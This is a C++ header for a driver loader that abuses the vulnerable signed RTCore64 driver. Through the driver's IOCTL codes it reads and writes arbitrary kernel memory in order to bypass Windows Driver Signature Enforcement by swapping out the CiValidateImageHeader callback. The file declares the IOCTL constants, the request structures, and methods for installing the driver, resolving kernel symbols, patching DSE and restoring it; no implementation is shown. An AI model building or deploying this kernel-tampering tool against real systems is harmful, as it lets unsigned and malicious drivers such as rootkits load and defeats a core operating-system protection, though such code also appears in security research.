#pragma once

#include <Windows.h>
#include <cstdint>
#include <optional>
#include "SymbolDownloader.h"

// RTCore64 IOCTL codes for memory read/write operations
constexpr DWORD RTC_IOCTL_MEMORY_READ = 0x80002048;
constexpr DWORD RTC_IOCTL_MEMORY_WRITE = 0x8000204C;

// RTCore64 driver communication structures
struct alignas(8) RTC_MEMORY_READ {
    BYTE Pad0[8];
    uint64_t Address;
    BYTE Pad1[8];
    uint32_t Size;
    uint32_t Value;
    BYTE Pad3[16];
};

struct alignas(8) RTC_MEMORY_WRITE {
    BYTE Pad0[8];
    uint64_t Address;
    BYTE Pad1[8];
    uint32_t Size;
    uint32_t Value;
    BYTE Pad3[16];
};

// Main driver loader and DSE bypass engine
class DrvLoader {
public:
    HANDLE hDriver{ INVALID_HANDLE_VALUE };
    std::optional<uint64_t> originalCallback;
    SymbolDownloader symbolDownloader;
    
    // Initializes symbol downloader and loads registry state
    bool Initialize();
    
    // Closes driver handle and cleans up resources
    void Cleanup();
    
    // Writes 32-bit value to kernel memory via RTCore64
    bool WriteMemory32(uint64_t address, uint32_t value);
    
    // Writes 64-bit value to kernel memory (two 32-bit writes)
    bool WriteMemory64(uint64_t address, uint64_t value);
    
    // Reads 32-bit value from kernel memory via RTCore64
    std::optional<uint32_t> ReadMemory32(uint64_t address);
    
    // Reads 64-bit value from kernel memory (two 32-bit reads)
    std::optional<uint64_t> ReadMemory64(uint64_t address);
    
    // Checks current DSE status and updates offsets
    bool CheckDSEStatus(bool& isPatched);
    
    // Patches DSE by replacing CiValidateImageHeader with safe function
    bool BypassDSE();
    
    // Restores original CiValidateImageHeader callback
    bool RestoreDSE();
    
private:
    // Locates ntoskrnl.exe base address in kernel memory
    std::optional<uint64_t> GetNtoskrnlBase();
    
    // Gets symbol offset from ntoskrnl.exe using PDB
    std::optional<uint64_t> GetKernelSymbolOffset(const std::wstring& symbolName);
    
    // Installs and starts RTCore64 driver service
    bool InstallAndStartDriver();
    
    // Stops and removes RTCore64 driver service
    bool StopAndRemoveDriver();
    
    // Verifies RTCore64.sys exists in System32\drivers
    bool CheckDriverFileExists();
};